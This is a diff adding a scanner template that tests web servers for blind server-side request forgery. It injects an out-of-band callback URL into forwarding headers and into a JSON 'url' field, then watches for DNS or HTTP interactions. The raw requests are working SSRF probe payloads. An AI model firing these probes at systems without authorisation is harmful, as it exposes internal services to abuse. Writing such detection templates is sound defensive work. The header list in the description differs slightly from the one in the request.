@@ -1,0 +1,54 @@
+id: ssrf-header-injection
+
+info:
+  name: SSRF via HTTP Header Injection (OOB)
+  author: chipo
+  severity: high
+  description: |
+    Tests HTTP headers commonly proxied or forwarded by backend services for SSRF
+    via header injection. Headers such as X-Forwarded-Host, X-Forwarded-For,
+    X-Real-IP, Referer, Origin, and X-Custom-IP-Authorization are injected with an
+    interactsh OOB URL. If the server uses any of these headers to construct outbound
+    requests or validation callbacks, the interaction will confirm SSRF.
+  reference:
+    - https://cwe.mitre.org/data/definitions/918.html
+    - https://portswigger.net/web-security/ssrf/blind
+    - https://www.rapid7.com/blog/post/2021/11/23/server-side-request-forgery-ssrf-explained/
+  metadata:
+    false-positive: |
+      Load balancers and reverse proxies that log X-Forwarded-For headers but do not
+      initiate outbound connections will not trigger an interaction. Confirm by checking
+      the interactsh interaction for full HTTP request content from an internal address.
+    max-request: 2
+  tags: ssrf,oob,interactsh,header-injection,owasp-a10
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Forwarded-For: {{interactsh-url}}
+        X-Real-IP: {{interactsh-url}}
+        Referer: https://{{interactsh-url}}
+        Origin: https://{{interactsh-url}}
+        True-Client-IP: {{interactsh-url}}
+        Connection: close
+
+      - |
+        POST /api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-Host: {{interactsh-url}}
+        Connection: close
+
+        {"url": "https://{{interactsh-url}}/probe"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
